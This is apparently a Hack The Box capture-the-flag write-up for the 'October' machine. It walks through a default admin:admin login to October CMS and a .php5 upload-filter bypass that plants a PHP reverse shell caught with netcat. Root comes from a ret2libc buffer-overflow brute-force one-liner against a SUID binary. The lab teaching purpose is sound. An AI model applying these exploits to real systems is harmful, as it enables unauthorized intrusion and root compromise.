---
clayout: ctf
title: October
date: 2025-08-28
image: /ctf/hack-the-box/machines/october/info-card.png
type: Hack The Box

ctf:
    - name: October
      link: https://app.hackthebox.com/machines/15
      thumbnail: /ctf/hack-the-box/machines/october/info-card.png
      pwned:
        - link: https://labs.hackthebox.com/achievement/machine/585215/15
          thumbnail: /ctf/hack-the-box/machines/october/pwned.png
---

## Machine Overview

Linux host exposing SSH (22/tcp) and HTTP (80/tcp). The web app is **October CMS**, which leads to an authenticated file upload and a straightforward initial shell. Privilege escalation is via a SUID binary with a classic stack buffer overflow (ret2libc).

## Enumeration

### Nmap

We start by running a nmap scan to get the open ports and services.

```bash
nmap -A -oN nmap.txt 10.10.10.16
```

**Scan results:**

```bash
PORT   STATE SERVICE    VERSION
22/tcp open  tcpwrapped
|_ssh-hostkey: ERROR: Script execution failed (use -d to debug)
80/tcp open  tcpwrapped
|_http-server-header: Apache/2.4.7 (Ubuntu)
|_http-title: October CMS - Vanilla
```

The HTTP title and headers indicate **October CMS** behind Apache on Ubuntu.

## Web Enumeration → Initial Foothold

Browse to `http://10.10.10.16/` → October CMS landing page.

![October CMS landing page](/ctf/hack-the-box/machines/october/home.png)

Per common OctoberCMS setups, the backend is at `/backend`. Visiting:

```url
http://10.10.10.16/backend
```

shows the login page.

![October CMS login page](/ctf/hack-the-box/machines/october/login.png)

Tried common weak defaults; `admin:admin` worked on this instance.

![October CMS backend login](/ctf/hack-the-box/machines/october/backend-panel.png)

Once authenticated, open **Media** in the backend. Direct `.php` uploads are blocked, but `.php5` is accepted.

Upload a reverse shell as [`php-reverse-shell.php5`](https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php).

![October CMS media upload](/ctf/hack-the-box/machines/october/upload.png)

Start a listener:

```bash
nc -lvnp 4444
```

Trigger the payload by clicking the uploaded file (or browsing to the media URL shown in the panel). Shell received:

```bash
$ id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

> [!NOTE] User flag
> The user flag is located at `/home/harry/user.txt`

> [!TIP] TTY upgrade (optional)
>
> ```bash
> python -c 'import pty; pty.spawn("/bin/bash")'
> export TERM=xterm
> ```

## Privilege Escalation (www-data → root)

### SUID discovery

```bash
find / -type f -perm -u=s 2>/dev/null
# ...
/usr/local/bin/ovrflw
```

Running it without args:

```bash
/usr/local/bin/ovrflw
Syntax: /usr/local/bin/ovrflw <input string>
```

### Vulnerability

Disassembly / decompilation shows:

```c
int main(int argc, char **argv) {
    if (argc > 1) {
        char buf[0x64];           // 100 bytes
        strcpy(buf, argv[1]);     // unbounded copy → overflow
        return 0;
    }
    printf("Syntax: %s <input string>\n", argv[0]);
    exit(0);
}
```

Classic stack overflow via `strcpy` into a local buffer in a **SUID root** binary → ret2libc.

### Protections & offset

Check protections:

```bash
checksec --file=/usr/local/bin/ovrflw
```

Determine exact EIP offset with a cyclic pattern. In this instance, **112** bytes of padding reached the saved return address.

### ret2libc payload

Layout: `[padding][system][return_after_system][pointer_to_"/bin/sh"]`.

ASLR is enabled, so the base of libc changes between runs. This box was solved by **brute-forcing** until the randomized libc base matched a known value for which the offsets were prepared.

**One-liner brute-force loop:**

```bash
while :; do
  /usr/local/bin/ovrflw "$(
    python -c 'import sys,struct
base=0xb75d8000               # example base that hit on this box
sys_off   = 0x00040310        # system
binsh_off = 0x00162bac        # "/bin/sh"
payload  = b"\x90"*112
payload += struct.pack("<I", base+sys_off)
payload += struct.pack("<I", 0xdeadbeef)      # return after system (unused)
payload += struct.pack("<I", base+binsh_off)
sys.stdout.buffer.write(payload)'
  )"
done
```

When the randomized libc base equals `0xb75d8000` on a given run, execution lands in `system("/bin/sh")` with effective UID `root`.

```bash
$ id
uid=33(www-data) gid=33(www-data) euid=0(root) groups=0(root),33(www-data)
```

> [!NOTE] Root flag
> The root flag is located at `/root/root.txt`
